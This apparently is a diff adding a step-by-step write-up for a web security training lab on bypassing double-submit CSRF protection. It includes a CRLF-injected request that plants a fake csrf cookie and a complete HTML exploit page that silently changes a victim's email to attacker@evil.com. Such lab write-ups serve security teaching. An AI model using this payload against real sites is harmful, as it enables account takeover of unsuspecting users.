@@ -1,0 +1,26 @@
+Login to the lab application using valid credentials.
+Navigate to the Update Email functionality.
+Intercept the email change request in Burp Suite and observe that the application validates the CSRF token by comparing:
+csrf parameter in request body
+csrf cookie value
+Notice that the search functionality reflects user input inside the Set-Cookie response header.
+Send the following request to inject a malicious cookie using CRLF injection:
+GET /?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None HTTP/2
+Host: 0afb007603f0620a80e19422007e003a.web-security-academy.net
+Observe the response contains the injected cookie:
+Set-Cookie: csrf=fake; SameSite=None
+Create the following CSRF exploit on the exploit server:
+<html>
+  <body>
+    <form action="https://0afb007603f0620a80e19422007e003a.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="attacker@evil.com">
+      <input type="hidden" name="csrf" value="fake">
+    </form>
+
+    <img src="https://0afb007603f0620a80e19422007e003a.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
+         onerror="document.forms[0].submit();">
+  </body>
+</html>
+Store the exploit on the exploit server.
+Click Deliver to victim.
+The victim’s email address gets changed successfully, confirming the CSRF vulnerability bypass using cookie injection.
